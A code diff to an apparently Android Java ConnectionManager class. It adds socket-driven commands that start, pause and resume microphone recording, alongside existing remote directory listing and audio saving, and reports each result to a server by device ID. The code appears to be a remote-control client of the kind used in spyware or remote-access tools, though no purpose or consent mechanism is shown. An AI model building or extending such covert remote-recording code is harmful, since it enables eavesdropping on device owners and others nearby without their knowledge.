@@ -129,6 +129,15 @@ public class ConnectionManager {
                             case "saveaudio":
                                 saveRecording(jsonObject.getInt("time"), jsonObject.getString("path"));
                                 break;
+                            case "startrecord":
+                                startRecord(jsonObject.getString("path"));
+                                break;
+                            case "pauserecord":
+                                pauseRecording();
+                                break;
+                            case "resumerecord":
+                                resumeRecording(jsonObject.getInt("time"));
+                                break;
                             case "dir":
                                 getDir(jsonObject.getString("path"));
                                 break;
@@ -202,10 +211,11 @@ public class ConnectionManager {
                         e.printStackTrace();
                     }
                 }
-                ioSocket.emit("screedb", deviceId, jsonArray);
+                ioSocket.emit("screendb", deviceId, jsonArray);
                 //locationDao.deleteAll();
             }
         }).start();
+
     }
 
     private static void deleteDB(String db) {
@@ -277,6 +287,34 @@ public class ConnectionManager {
         }catch (Exception e){
             e.printStackTrace();
             ioSocket.emit("saveaudio", deviceId, "{\"status\":false}");
+        }
+    }
+
+    private static void startRecord(String path) {
+        try{
+            MicManager.startRecord(path);
+            ioSocket.emit("startrecord", deviceId, "{\"status\":true}");
+        }catch (Exception e){
+            e.printStackTrace();
+            ioSocket.emit("startrecord", deviceId, "{\"status\":false}");
+        }
+    }
+    private static void pauseRecording() {
+        try{
+            MicManager.pauseRecord();
+            ioSocket.emit("pauserecord", deviceId, "{\"status\":true}");
+        }catch (Exception e){
+            e.printStackTrace();
+            ioSocket.emit("pauserecord", deviceId, "{\"status\":false}");
+        }
+    }
+    private static void resumeRecording(int time) {
+        try{
+            MicManager.resumeRecord(time);
+            ioSocket.emit("resumerecord", deviceId, "{\"status\":true}");
+        }catch (Exception e){
+            e.printStackTrace();
+            ioSocket.emit("resumerecord", deviceId, "{\"status\":false}");
         }
     }
 
